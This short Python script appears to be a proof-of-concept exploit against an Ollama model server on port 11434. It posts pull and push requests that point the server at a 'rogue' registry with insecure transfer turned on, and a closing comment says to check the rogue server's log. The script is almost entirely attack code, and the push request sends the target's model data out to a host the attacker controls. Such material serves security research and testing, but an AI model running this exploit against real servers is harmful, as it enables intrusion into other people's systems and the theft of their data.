import requests

HOST = "dev-1.lan.bi0x.com"
target_url = f"http://{HOST}:11434"

vuln_registry_url = f"{HOST}/rogue/bi0x"

pull_url = f"{target_url}/api/pull"
push_url = f"{target_url}/api/push"

requests.post(pull_url, json={"name": vuln_registry_url, "insecure": True})
requests.post(push_url, json={"name": vuln_registry_url, "insecure": True})

# see rogue server log